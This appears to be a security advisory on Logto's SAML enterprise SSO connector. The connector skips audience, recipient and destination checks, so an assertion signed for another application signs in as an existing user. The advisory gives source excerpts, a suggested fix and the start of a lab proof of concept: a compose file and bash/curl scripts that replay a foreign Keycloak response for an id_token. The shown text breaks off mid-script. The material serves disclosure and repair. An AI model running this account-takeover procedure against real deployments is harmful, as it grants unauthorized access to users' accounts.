### Summary

Logto's SAML enterprise SSO connector accepts an assertion the configured identity provider signed for a different service provider, and completes a sign-in as whichever user that assertion names. This was reproduced end to end against the current release, and every release since 1.12.0 carries the route it was reproduced through. The affected-range note sets out the one place below that the range could turn out wider, and why that is not claimed.

`handleSamlAssertion` builds a samlify `ServiceProvider` from the connector's SP entityID and the identity provider certificate, calls `parseLoginResponse`, and returns the parsed extract. samlify verifies the signature, the issuer and the `Conditions` time window, and its documentation assigns `AudienceRestriction`, the bearer `SubjectConfirmationData` `Recipient`, the response `Destination` and `InResponseTo` to the caller. Logto reads none of them, at any revision since the class was added. A signature proves which identity provider issued an assertion. The audience is the field that says which application it was issued to. With the audience unread, Logto's assertion consumer service treats every assertion that identity provider signs under the configured issuer as a valid sign-in, whatever application it was minted for, and the sign-in ends in OIDC tokens for the applications of that Logto tenant.

Two consequences were measured against the released image with a Keycloak realm as the identity provider, which signs every SAML client in the realm with one realm key under one realm issuer. A response the realm addressed to another application, posted to Logto's assertion consumer service, completed sign-in with the same `sub` and the same `email` as the baseline response addressed to Logto's own service provider. And the identity provider cannot withhold access to Logto: with Logto's own SAML client set `enabled=false` at the realm, the normal sign-in path is refused at the identity provider before any login, while that same foreign response still issues an id_token for the user. An operator who removes Logto from a user at the identity provider has not removed it.

### Affected range, and how each end was established

The lower bound is the first release carrying the enterprise SSO assertion consumer service, `/authn/${ssoPath}/saml/:connectorId`, which is the route this report reproduces. It arrives in `edb2bdcce`, "feat(core): add the saml assertion handle flow (#4872)", committed 2023-11-17T06:14:45Z: absent from `packages/core/src/routes/authn.ts` at the `v1.11.0` tag, registered at line 175 of that file at `v1.12.0`. That commit lands after the `v1.11.0` tag, dated 2023-11-14T11:57:42Z, and before the `v1.12.0` tag, dated 2023-12-06T08:13:56Z.

The upper end is measured rather than inferred. The behaviour was reproduced end to end on the official `svhd/logto:1.45.0` image, the release tagged 2026-10-13T07:30:57Z, on two independently built rigs, through that same route.

There is one place the range could turn out wider, and it is deliberately not claimed. The unchecked helper predates the route it is usually reached through: `40a5a18d9`, "feat(core): add saml sso class", authored 2023-11-02T03:17:34Z and committed 2023-11-07T04:01:35Z, and the earliest release carrying it is 1.11.0, found by enumerating the `v*` tags that contain that commit and sorting them by tag date rather than by name. At `v1.11.0` the helper sits at `packages/core/src/sso/SamlConnector/utils.ts:137` with the same `parseLoginResponse` call and no audience read: a case-insensitive search of that whole file at that tag for `audience` and `InResponseTo` returns nothing, and the only match for `destination` is a local variable in the attribute-mapping code at line 114, unrelated to a response `Destination`. An HTTP route reaches it there, and that route names SAML nowhere, dispatching on the stored connector's provider name instead: `POST /interaction/single-sign-on/:connectorId/authentication` at `packages/core/src/routes/interaction/single-sign-on.ts:73-74`, body guard `z.record(z.unknown())` at line 79, `getSsoAuthentication` at line 102, `connectorInstance.getUserInfo(data, ...)` at `packages/core/src/routes/interaction/utils/single-sign-on.ts:106`, `packages/core/src/sso/SamlSsoConnector/index.ts:56-57`, and `packages/core/src/sso/SamlConnector/index.ts:96` calling `handleSamlAssertion` at line 109.

What keeps that from being a claim is a single step read off the types rather than observed. At `v1.11.0` line 109 passes its argument to `handleSamlAssertion` unwrapped, where the current release wraps it as `{ body }` at `index.ts:152`, under a comment saying the helper takes an HTTP-response-like object, so a request on the interaction route would have to carry that shape itself. Nothing was ever posted to that route to find out: no 1.11.0 build was run and no 1.11.0 container was started. A floor does not rest on a type inference, so the affected range starts where the reproduced route starts, and 1.11.0 stands here as the place the range may extend rather than the place it is claimed to begin. Below 1.11.0 there is nothing to claim either way, because the helper does not exist.

### Details

`packages/core/src/sso/SamlConnector/utils.ts:176-206`, at `master` `d382f0c21de7`:

```ts
export const handleSamlAssertion = async (
  request: ESamlHttpRequest,
  identityProvider: saml.IdentityProviderInstance,
  metadata: { entityId: string; x509Certificate: string }
): Promise<SsoSamlAssertionContent> => {
  const { entityId: entityID, x509Certificate } = metadata;

  // eslint-disable-next-line new-cap
  const serviceProvider = saml.ServiceProvider({
    entityID,
    signingCert: x509Certificate,
  });

  // Used to check whether xml content is valid in format.
  saml.setSchemaValidator(validator);

  try {
    const assertionResult = await serviceProvider.parseLoginResponse(
      identityProvider,
      'post',
      request
    );

    return ssoSamlAssertionContentGuard.parse(assertionResult.extract);
  } catch (error: unknown) {
    throw new SsoConnectorError(SsoConnectorErrorCodes.AuthorizationFailed, {
      message: 'Invalid SAML assertion',
      error: error instanceof ZodError ? error.flatten() : error,
    });
  }
};
```

The value the audience has to be compared against is already inside this function. `entityID` is the connector's declared service provider entityID, built by `packages/core/src/sso/SamlConnector/utils.ts:233-235`:

```ts
export const buildSpEntityId = (baseUrl: URL, connectorId: string) => {
  return appendPath(baseUrl, `/enterprise-sso/${connectorId}`).toString();
};
```

It is used only to construct the samlify `ServiceProvider` object and is never compared with anything in the response. The parsed extract is not stripped of the field either. `packages/schemas/src/foundations/jsonb-types/sso-connector.ts:23-35`:

```ts
export const ssoSamlAssertionContentGuard = z
  .object({
    nameID: z.string().optional(),
    attributes: z.record(z.string().or(z.array(z.string()))).optional(),
    conditions: z
      .object({
        notBefore: z.string().optional(),
        notOnOrAfter: z.string().optional(),
      })
      .optional(),
  })
  .catchall(z.unknown());
```

The `catchall` means samlify's `audience` and `response` keys survive the parse as unknown values. They are present and never read.

What the route does with the result, `packages/core/src/routes/authn.ts:305-312`:

```ts
      const assertionContent = await connectorInstance.parseSamlAssertionContent(body);
      const userInfo = connectorInstance.getUserInfoFromSamlAssertion(assertionContent);

      // Store the extracted user info to the connector session storage for later use.
      await assignSamlAssertionResultViaJti(jti, provider, {
        ...singleSignOnSession,
        userInfo,
      });
```

`getUserInfoFromSamlAssertion` keeps the `nameID` and the attribute statement and nothing else, `packages/core/src/sso/SamlConnector/index.ts:170-177`. The account is then selected from those two values alone, `packages/core/src/libraries/verification-helpers/single-sign-on.ts:304-327`:

```ts
  const userSsoIdentity = await userSsoIdentitiesQueries.findUserSsoIdentityBySsoIdentityId(
    issuer,
    userInfo.id
  );

  // SignIn
  if (userSsoIdentity) {
    return signInWithSsoAuthentication(ctx, tenant, {
      connectorData,
      userSsoIdentity,
      ssoAuthentication,
    });
  }

  const user = userInfo.email && (await usersQueries.findUserByEmail(userInfo.email));

  // SignIn and link with existing user account with a same email
  if (user) {
    return signInAndLinkWithSsoAuthentication(ctx, tenant, {
      connectorData,
      user,
      ssoAuthentication,
    });
  }
```

The second branch is why a user who has never used SSO is reachable: the assertion's mapped `email` finds an existing account and the foreign assertion is linked to it on first use.

The one thing the route does require is a `RelayState` naming a live single sign-on session, `packages/core/src/routes/authn.ts:285-291`:

```ts
      // TODO: remove this assertion after the IdP initiated SSO flow is implemented
      assertThat(
        jti,
        new RequestError({
          code: 'session.connector_validation_session_not_found',
          status: 404,
        })
      );
```

That session is one the attacker opens at Logto in the same request sequence, and the assertion is never compared with the authentication request that session sent, so `RelayState` establishes that some sign-in was started at this Logto and never which assertion is acceptable.

Affected locations:

| Location | What is missing |
| --- | --- |
| `packages/core/src/sso/SamlConnector/utils.ts:193-199` | the parsed response is never checked against the `entityID` the same function was given |
| `packages/core/src/routes/authn.ts:305-306` | the extract is turned into user info with no audience, recipient or destination gate |
| `packages/core/src/routes/authn.ts:177-320` | no record of the outstanding authentication request, so `InResponseTo` cannot be checked and a response can be posted again inside its `Conditions` window |

The shipped dependency leaves these checks to the caller. `packages/core/package.json:101` resolves `samlify` to `^2.13.0`; the measured image bundles 2.13.1. Read inside the running container during the measured run: in `samlify/build/src/flow.js` the string `audience` occurs 0 times, `build/src/extractor.js:132` defines an `audience` key for callers, and the only rejections `postFlow` can raise are `FAILED_TO_VERIFY_SIGNATURE`, `ERR_UNMATCH_ISSUER`, `ERR_EXPIRED_SESSION`, `ERR_SUBJECT_UNCONFIRMED` and the XML and status errors.

**Suggested fix.** After `parseLoginResponse`, before the extract is returned, require the audience to contain the `entityID` the function already holds, require the bearer `SubjectConfirmationData` `Recipient` and the response `Destination`, when present, to equal the connector's assertion consumer service URL from `buildAssertionConsumerServiceUrl`, and compare `InResponseTo` with the authentication request id stored on the single sign-on session for SP-initiated logins. The field names below are samlify's documented `parseLoginResponse` output, and both expected values are already derived from the connector id and the tenant endpoint:

```ts
const assertionResult = await serviceProvider.parseLoginResponse(identityProvider, 'post', request);
const { extract } = assertionResult;

// entityID is this function's own argument; acsUrl is buildAssertionConsumerServiceUrl(endpoint, connectorId)
const audience = Array.isArray(extract.audience) ? extract.audience : [extract.audience];

if (!audience.includes(entityID)) {
  throw new SsoConnectorError(SsoConnectorErrorCodes.AuthorizationFailed, { message: 'Invalid SAML assertion' });
}

if (extract.response?.destination && extract.response.destination !== acsUrl) {
  throw new SsoConnectorError(SsoConnectorErrorCodes.AuthorizationFailed, { message: 'Invalid SAML assertion' });
}
```

A short-lived record of consumed assertion ids would close the replay measured below. `@better-auth/sso`, another samlify consumer, performs the audience, bearer recipient and destination checks on this same `parseLoginResponse` output. A regression test needs two service providers whose assertions are signed by one key, and must assert that the one addressed elsewhere is refused.

**Three further notes on the affected range set out above.**

The first is how not to check the floor: by searching for a route pattern rather than by reading the files. A search for `saml/:connectorId` at `v1.11.0` returns one hit, and it is a third subsystem, unrelated to either route in the affected-products note: `POST /authn/saml/:connectorId` at `packages/core/src/routes/authn.ts:95` there belongs to the legacy SAML social connector, and its handler asserts the connector is of social type before handing the body to that connector's own methods. It and the enterprise SSO route coexist from 1.12.0 onward. Nothing in this report concerns the social connector route.

No release carries the check. At `master` `d382f0c21de7`, a content search of `packages/core/src/sso/` for `audience`, `Destination`, `InResponseTo` and `Recipient` returns one hit, `packages/core/src/sso/OidcConnector/utils.ts:179`, which is the OIDC connector checking its own token audience. No licence is involved: outside Logto Cloud `packages/core/src/libraries/quota.ts:148-168` enforces only `samlApplicationsLimit` and `idpInitiatedSsoEnabled`, and SP-initiated enterprise SSO is neither.

One further `v1.11.0` detail, since it bears on how finished the feature was there: `packages/core/src/routes/interaction/utils/single-sign-on-guard.ts:14` carries a `TODO: @simeng-li remove the dev features check when the SSO feature is released` and gates the SSO email identifier on `isDevFeaturesEnabled`, although both the SSO interaction routes and the SSO connector management routes are registered unconditionally at that tag, at `packages/core/src/routes/interaction/index.ts:381` and `packages/core/src/routes/init.ts:63`.

### Proof of concept

**1. Exact release, environment and platform prerequisites.** Docker 29.1.3 on a Windows 11 host, with `bash`, `curl`, `python` and `node` available to the scripts. Three containers, all published on loopback only: the Logto release under test as `svhd/logto:1.45.0` on `127.0.0.1:39001` and `127.0.0.1:39002`, `postgres:17-alpine` as its database, and Keycloak 26.x as the identity provider on `127.0.0.1:28080`, named `kc-lab` and started with `KC_BOOTSTRAP_ADMIN_USERNAME` and `KC_BOOTSTRAP_ADMIN_PASSWORD` set, which is how the scripts read its admin credentials. The Keycloak patch version and its exact start command were not recorded in the measured run and are not reconstructed here. `other-app.lab` is never resolved; its URLs exist only as text inside the responses Keycloak signs. Nothing here depends on the host architecture, and the host architecture was not recorded: every run was a native container run on that one Windows host, and no emulated run and no forced-platform run was measured.

**2. Files.** Four files, all inline in this section: the compose file for the Logto release and its database, and the three scripts of steps 6, 9 and 11. There are no attachments, so nothing is lost if this document is forwarded on its own.

**3. Create an empty directory** and place those four files in it, plus an empty `out/` subdirectory, which the scripts write into and do not create. Every script runs from that directory.

**4. Start the release under test.**

```yaml
# Lab copy of logto's demo compose: pinned image, loopback-only ports, its own project name.
name: logto-lab
services:
  app:
    depends_on:
      postgres:
        condition: service_healthy
    image: svhd/logto:1.45.0
    entrypoint: ["sh", "-c", "npm run cli db seed -- --swe && npm start"]
    ports:
      - 127.0.0.1:39001:3001
      - 127.0.0.1:39002:3002
    environment:
      - TRUST_PROXY_HEADER=1
      - DB_URL=postgres://postgres:p0stgr3s@postgres:5432/logto
      - ENDPOINT=http://localhost:39001
      - ADMIN_ENDPOINT=http://localhost:39002
  postgres:
    image: postgres:17-alpine
    user: postgres
    ports:
      - 127.0.0.1:39432:5432
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: p0stgr3s
    healthcheck:
      test: ["CMD-SHELL", "pg_isready"]
      interval: 5s
      timeout: 5s
      retries: 5
```

```sh
docker compose up -d
docker compose logs -f app
```

The entrypoint above seeds the database before starting the server, so the first start takes longer than later ones. Wait until the `app` container is serving on `127.0.0.1:39001` before running anything below; the log follow is the readiness check, and no bounded readiness loop for Logto was part of the measured run.

**5. Fixture, attacker and control roles, and the three per-installation values the scripts take.** In the admin console on `127.0.0.1:39002`, create a SAML enterprise SSO connector with manual configuration, enable enterprise SSO in the sign-in experience, create a traditional web application as the OIDC client, create a machine-to-machine application with the Management API `all` scope, and create the victim user with a primary email and no SSO identity. The scripts then take:

| Placeholder | Where the reader gets it | What the scripts do with it |
| --- | --- | --- |
| `<connectorId>` | the SAML enterprise SSO connector's id, shown in the console and returned by `GET /api/sso-connectors` | selects the connector, and therefore the service provider entityID `http://localhost:39001/enterprise-sso/<connectorId>` and the assertion consumer service `http://localhost:39001/api/authn/single-sign-on/saml/<connectorId>`, which are what `buildSpEntityId` and `buildAssertionConsumerServiceUrl` compute |
| `<appId>` and `app.secret` | the traditional web application's App ID and App Secret | exchanges the authorization code for an id_token |
| `<m2mAppId>` and `m2m.secret` | the machine-to-machine application's App ID and App Secret | patches the connector configuration through the Management API |

No value of ours is substituted for these. They are per-installation identifiers, and the lab's own values are not in this report.

**6. Point the connector at the identity provider, and register Logto as a second client beside one that already exists.** `kc-logto.sh`:

```sh
#!/usr/bin/env bash
# Point the Logto enterprise-SSO connector at the real Keycloak lab realm, and register Logto's SP
# as a second SAML client beside the one that already exists for another application.
set -eu
cd "$(dirname "$0")"
K=http://127.0.0.1:28080; R=lab; C=<connectorId>
L=http://127.0.0.1:39001; LHOST=http://localhost:39001
ACS=$LHOST/api/authn/single-sign-on/saml/$C; SPID=$LHOST/enterprise-sso/$C
U=$(docker exec kc-lab printenv KC_BOOTSTRAP_ADMIN_USERNAME); P=$(docker exec kc-lab printenv KC_BOOTSTRAP_ADMIN_PASSWORD)
T=$(curl -s -X POST $K/realms/master/protocol/openid-connect/token -d client_id=admin-cli -d username="$U" -d password="$P" -d grant_type=password | python -I -c "import json,sys;print(json.load(sys.stdin)['access_token'])")

# Logto's own SAML client at the IdP, so a baseline response addressed to Logto can be obtained
EX=$(curl -s -H "authorization: Bearer $T" "$K/admin/realms/$R/clients?clientId=$SPID" | python -I -c "import json,sys;d=json.load(sys.stdin);print(d[0]['id'] if d else '')")
if [ -z "$EX" ]; then
  curl -s -o /dev/null -w "   create logto saml client: %{http_code}\n" -X POST "$K/admin/realms/$R/clients" -H "authorization: Bearer $T" -H 'content-type: application/json' -d "{
    \"clientId\": \"$SPID\", \"protocol\": \"saml\", \"enabled\": true, \"baseUrl\": \"$ACS\",
    \"redirectUris\": [\"$ACS\"], \"adminUrl\": \"$ACS\",
    \"attributes\": {\"saml.assertion.signature\": \"true\", \"saml.server.signature\": \"true\",
      \"saml_name_id_format\": \"email\", \"saml_force_name_id_format\": \"true\",
      \"saml.client.signature\": \"false\", \"saml_assertion_consumer_url_post\": \"$ACS\",
      \"saml_single_logout_service_url_post\": \"$ACS\"}}"
  EX=$(curl -s -H "authorization: Bearer $T" "$K/admin/realms/$R/clients?clientId=$SPID" | python -I -c "import json,sys;print(json.load(sys.stdin)[0]['id'])")
else
  echo "   logto saml client already present"
fi
# an alias so /realms/lab/protocol/saml/clients/logto resolves, and the email attribute
curl -s -o /dev/null -X PUT "$K/admin/realms/$R/clients/$EX" -H "authorization: Bearer $T" -H 'content-type: application/json' \
  -d "$(curl -s -H "authorization: Bearer $T" "$K/admin/realms/$R/clients/$EX" | python -I -c "
import json,sys
d=json.load(sys.stdin); d.setdefault('attributes',{})['saml_idp_initiated_sso_url_name']='logto'; print(json.dumps(d))")"
HAS=$(curl -s -H "authorization: Bearer $T" "$K/admin/realms/$R/clients/$EX/protocol-mappers/models" | python -I -c "import json,sys;print(any(m['name']=='email' for m in json.load(sys.stdin)))")
if [ "$HAS" != "True" ]; then
  curl -s -o /dev/null -w "   add email mapper: %{http_code}\n" -X POST "$K/admin/realms/$R/clients/$EX/protocol-mappers/models" -H "authorization: Bearer $T" -H 'content-type: application/json' \
    -d '{"name":"email","protocol":"saml","protocolMapper":"saml-user-property-mapper","config":{"user.attribute":"email","attribute.name":"email","attribute.nameformat":"Basic","friendly.name":"email"}}'
fi

# the realm's signing certificate and issuer, straight from the published descriptor
CERT=$(curl -s "$K/realms/$R/protocol/saml/descriptor" | python -I -c "import sys,re;print(re.search(r'<ds:X509Certificate>([^<]+)',sys.stdin.read()).group(1))")
echo "   realm cert: ${#CERT} chars, issuer http://localhost:28080/realms/$R"

MT=$(curl -s -X POST http://127.0.0.1:39001/oidc/token -u "<m2mAppId>:$(cat m2m.secret)" -d grant_type=client_credentials -d resource=https://default.logto.app/api -d scope=all | python -I -c "import json,sys;print(json.load(sys.stdin)['access_token'])")
curl -s -o conn-kc.json -w "   patch logto connector -> keycloak: %{http_code}\n" -X PATCH "$L/api/sso-connectors/$C" -H "authorization: Bearer $MT" -H 'content-type: application/json' -d "$(python -I -c "
import json,sys
print(json.dumps({'config':{'entityId':'http://localhost:28080/realms/$R','signInEndpoint':'http://localhost:28080/realms/$R/protocol/saml','x509Certificate':'''$CERT'''}}))")"
python -I -c "
import json
d=json.load(open('conn-kc.json'))
c=d.get('config') or {}
print('   connector now:', c.get('entityId'), '| cert chars', len(c.get('x509Certificate') or ''))"
```

**7. The explicit capability measurement this rests on.** The certificate the script copies into the connector is the one the realm publishes at `/realms/lab/protocol/saml/descriptor`, which is the document an operator pastes into the connector when adding SSO. It is the realm key, not a key specific to Logto, and the realm issuer `http://localhost:28080/realms/lab` is the issuer of every client's assertions. That is the measured starting point of the whole finding: trusting the identity provider's published metadata is trusting one key and one issuer for every relying party in the realm.

**8. Fresh state.** The victim exists in Logto with a primary email and no SSO identity, created before any of this. The realm holds that one user, and two SAML clients that know nothing about each other: Logto's own, and one for another application with clientId `https://other-app.lab/metadata`, both released an `email` attribute mapper.

**9. The baseline, the test, the identity-provider policy control and the replay control.** `kc-cases.sh` drives the Logto experience API exactly as the sign-in page drives it, once per case:

```sh
#!/usr/bin/env bash
# Logto enterprise SSO against the REAL Keycloak lab realm, which signs two SAML clients with one realm key.
#   baseline : victim at Logto's own client   -> response addressed to Logto
#   test     : victim at the other-app client -> response addressed to another SP, POSTed to Logto's ACS
#   control  : the IdP is told to refuse Logto (client disabled) - the normal path must die, the test must not
#   control  : replay of one captured foreign response in three independent sessions
set -u
cd "$(dirname "$0")"
K=http://localhost:28080; R=lab; C=<connectorId>
L=http://127.0.0.1:39001; APP=<appId>
ACS=$L/api/authn/single-sign-on/saml/$C
U=$(docker exec kc-lab printenv KC_BOOTSTRAP_ADMIN_USERNAME); P=$(docker exec kc-lab printenv KC_BOOTSTRAP_ADMIN_PASSWORD)
T=$(curl -s -X POST $K/realms/master/protocol/openid-connect/token -d client_id=admin-cli -d username="$U" -d password="$P" -d grant_type=password | python -I -c "import json,sys;print(json.load(sys.stdin)['access_token'])")

idp() { # alias user pass -> SAMLResponse, or IDP_* on refusal
  J=$(mktemp)
  PG=$(curl -s -c "$J" -b "$J" "$K/realms/$R/protocol/saml/clients/$1")
  A=$(echo "$PG" | grep -o 'id="kc-form-login"[^>]*action="[^"]*"' | grep -o 'action="[^"]*"' | sed 's/action="//;s/"$//;s/&amp;/\&/g')
  if [ -z "$A" ]; then echo "IDP_REFUSED_BEFORE_LOGIN"; rm -f "$J"; return; fi
  PG=$(curl -s -c "$J" -b "$J" "$A" --data-urlencode "username=$2" --data-urlencode "password=$3" --data-urlencode credentialId=)
  rm -f "$J"
  RS=$(echo "$PG" | grep -o 'name="SAMLResponse" value="[^"]*"' | sed 's/.*value="//;s/"$//')
  if [ -z "$RS" ]; then echo "IDP_DENIED"; else echo "$RS"; fi
}
describe() { python -I -c "
import base64,re,sys,html
x=base64.b64decode(open(sys.argv[1]).read()).decode()
g=lambda p: (re.search(p,x) or [None,'<absent>'])[1]
print('   Audience %s | Destination %s | Recipient %s | email %s' % (
  g(r'Audience>([^<]+)<'), g(r'Destination=\"([^\"]*)\"'), g(r'Recipient=\"([^\"]*)\"'), g(r'<saml:AttributeValue[^>]*>([^<]+)<')))" "$1"; }

run() { # label b64file
  echo; echo "== $1"; describe "$2"
  J=$(mktemp); CB=http://localhost:39999/cb
  curl -s -o /dev/null -c $J -b $J "$L/oidc/auth?client_id=$APP&redirect_uri=$CB&response_type=code&scope=openid%20email&state=s1&prompt=login"
  curl -s -o /dev/null -c $J -b $J -X PUT $L/api/experience -H 'content-type: application/json' -d '{"interactionEvent":"SignIn"}'
  RR=$(curl -s -c $J -b $J -X POST $L/api/experience/verification/sso/$C/authorization-uri -H 'content-type: application/json' -d "{\"state\":\"st1\",\"redirectUri\":\"$L/sso-callback\"}")
  VID=$(echo "$RR" | python -I -c "import json,sys;print(json.load(sys.stdin).get('verificationId',''))")
  RLS=$(echo "$RR" | python -I -c "import json,sys,urllib.parse as u
try: print(u.parse_qs(u.urlparse(json.load(sys.stdin)['authorizationUri']).query)['RelayState'][0])
